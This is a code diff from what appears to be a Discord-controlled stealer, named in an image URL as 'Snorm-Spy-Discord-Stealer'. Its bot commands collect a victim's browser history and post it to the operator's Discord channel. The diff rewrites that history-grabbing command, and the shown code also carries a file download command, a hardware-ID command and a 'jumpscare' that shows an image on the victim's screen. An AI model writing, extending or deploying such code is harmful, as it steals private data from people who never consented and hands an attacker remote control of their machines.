@@ -368,21 +368,10 @@ def get_browser_history(browser_name):
 
 @bot.command()
 async def browser(ctx):
-    histories = {
-        "Chrome": get_browser_history("Chrome"),
-        "Edge": get_browser_history("Edge"),
-        "Brave": get_browser_history("Brave"),
-        "Vivaldi": get_browser_history("Vivaldi"),
-        "Opera": get_browser_history("Opera"),
-        "Opera GX": get_browser_history("Opera GX")
-    }
+    chrome_history = get_browser_history("Chrome")
+    edge_history = get_browser_history("Edge")
 
-    with open("Browsers.txt", "w", encoding="utf-8") as file:
-        for browser, history in histories.items():
-            file.write(f"=== {browser} History ===\n")
-            file.write(f"{history}\n\n")
-
-    await ctx.send(file=discord.File("Browsers.txt"))
+    await ctx.send(f"{chrome_history}\n\n{edge_history}")
 
 @bot.command()
 async def download(ctx, file_path: str):
@@ -458,7 +447,7 @@ async def hwid(ctx):
 
 @bot.command()
 async def jumpscare(ctx):
-    
+    """Displays an image on the user's screen."""
 
     
     image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-Stealer-/blob/main/scarylarry.png?raw=true"
